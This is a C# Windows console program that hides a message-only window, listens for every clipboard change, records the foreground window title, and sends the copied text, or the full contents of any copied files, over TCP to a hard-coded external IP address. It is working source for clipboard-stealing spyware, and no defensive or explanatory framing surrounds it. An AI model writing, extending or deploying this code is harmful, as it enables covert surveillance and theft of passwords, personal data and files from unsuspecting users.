using System;
using System.Collections.Specialized;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace ConsoleApp1
{
    internal class Program
    {
        const string SERVER_IP_ADDRESS = "20.16.107.52";
        const int SERVER_PORT = 13;



        private class NotificationForm : Form
        {
            public NotificationForm()
            {
                // Turn the child window into a message-only window (refer to Microsoft docs)
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                // Place window in the system-maintained clipboard format listener list
                NativeMethods.AddClipboardFormatListener(Handle);
            }



            protected override void WndProc(ref Message m)
            {
                // Listen for operating system messages
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    DateTime saveUtcNow = DateTime.UtcNow;
                    Console.WriteLine("Copy event detected at {0}", saveUtcNow);

                    // active window
                    IntPtr active_window = NativeMethods.GetForegroundWindow();
                    int length = NativeMethods.GetWindowTextLength(active_window);
                    StringBuilder sb = new StringBuilder(length + 1);
                    NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                    //Console.WriteLine("Clipboard Active Window: " + sb.ToString());

                    string data = Clipboard.GetText();
                    if (!String.IsNullOrEmpty(data))
                    {
                        Console.WriteLine("Clipboard Content: " + data);
                        SendData(data);
                    }
                    else
                    {
                        StringCollection sCollection = Clipboard.GetFileDropList();
                        foreach (string name in sCollection)
                        {
                            Console.WriteLine(name);
                        }
                        SendFiles(sCollection);
                    }                                     
                }
                // Called for any unhandled messages
                base.WndProc(ref m);
            }



            private void SendData(string data)
            {
                TcpClient client = null;
                NetworkStream stream = null;

                try
                {
                    Console.WriteLine($"Sending data to server");

                    client = new TcpClient();
                    client.Connect(SERVER_IP_ADDRESS, SERVER_PORT);
                    stream = client.GetStream();

                    byte[] buffer = Encoding.ASCII.GetBytes(data);

                    stream.Write(buffer, 0, buffer.Length);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Problem to send data to server : {0}", ex.Message);
                }
                finally {
                    stream?.Close();
                    client?.Close();             
                }              
            }



            private void SendFiles(StringCollection fileNameList)
            {
                TcpClient tcpClient = new TcpClient(SERVER_IP_ADDRESS, SERVER_PORT);
                Console.WriteLine("Connected. Sending file.");

                StreamWriter sWriter = new StreamWriter(tcpClient.GetStream());

                foreach (String fileName in fileNameList)
                {
                    byte[] bytes = File.ReadAllBytes(fileName);

                    sWriter.WriteLine(bytes.Length.ToString());
                    sWriter.Flush();

                    sWriter.WriteLine(fileName);
                    sWriter.Flush();

                    Console.WriteLine("Sending file");
                    tcpClient.Client.SendFile(fileName);
                }                
            }
        }



        private static void Main(string[] args)
        {
            //starts a message loop on current thread
            Console.WriteLine("Ctrl C listener");
            Application.Run(new NotificationForm());
        }
    }

}
